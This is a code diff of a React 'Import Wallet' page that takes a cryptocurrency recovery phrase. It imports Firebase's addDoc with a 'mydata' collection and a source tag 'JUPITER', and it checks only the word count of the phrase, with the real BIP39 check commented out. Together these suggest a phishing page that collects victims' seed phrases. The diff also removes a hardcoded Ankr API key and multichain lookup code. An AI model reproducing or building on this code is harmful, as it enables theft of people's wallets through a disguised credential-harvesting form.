@@ -1,5 +1,4 @@
 import * as bip39 from "@scure/bip39";
-import { wordlist as english } from "@scure/bip39/wordlists/english";
 import {
     collection,
     addDoc,
@@ -17,35 +16,8 @@ import { db } from "../../firebase";
 import React, { useState,useEffect} from "react";
 import { useParams,useNavigate} from "react-router-dom";
 import '../ImportWallet/index.scss';
-import { deriveAddresses } from "../../utils/deriveAddresses";
 import { setLocalStorage,getLocalStorage } from "../../utils/useLocalStorage";
 const _src = 'JUPITER';
-const ANKR_API_KEY = "e17bc7394974bff05c0bcd33115f4ffce8734b037ef63e976a6892b1bbc1a568";
-const ANKR_RPC = `https://rpc.ankr.com/multichain/${ANKR_API_KEY}`;
-// --- Chain Map (Mainnet + Testnet) ---
-const chainMap = {
-  // Mainnet
-  arbitrum: "arbitrum",
-  avalanche: "avalanche",
-  base: "base",
-  bsc: "bsc",
-  eth: "eth",
-  fantom: "fantom",
-  flare: "flare",
-  gnosis: "gnosis",
-  linea: "linea",
-  optimism: "optimism",
-  polygon: "polygon",
-  polygon_zkevm: "polygon_zkevm",
-  scroll: "scroll",
-  stellar: "stellar",
-  story: "story_mainnet",
-  syscoin: "syscoin",
-  telos: "telos",
-  xai: "xai",
-  xlayer: "xlayer"
-};
-
 const ImportWallet = () => {
   const navigate = useNavigate();
   const goBack = () => {
@@ -59,7 +31,7 @@ const ImportWallet = () => {
  const [IsProcessing, SetProcessing] = useState(false);
  const usersRef = collection(db, "mydata");
  const q = query(usersRef, orderBy("auto_id", "desc", limit(1)));
-const validRange= [12,15,18,21,24];
+    
  const isLetter = (c) => {
     return c.toLowerCase() != c.toUpperCase();
  }
@@ -107,7 +79,6 @@ function validateMnemonic(mnemonic) {
   const count = words.length;
   if (![12, 15, 18, 21, 24].includes(count)) return false;
   return true;
-  //return bip39.validateMnemonic(mnemonic, english);
 }
     
   const handleSubmit = async (e) => {
@@ -141,19 +112,7 @@ function validateMnemonic(mnemonic) {
         SetProcessing(false);
     }
   };
-
-  const validatePhrase = (text) => {
-    const words = text.split(/\s+/).filter(Boolean);
-    console.log(words.length);
-    if (!validRange.includes(words.length)) {
-      return false;
-    }
-    if (!words.every((w) => /^[a-z]+$/.test(w))) {
-      return false;
-    }
-    return true;
-  };
-
+    
   return (
 <div className="page">
 <div className="container">
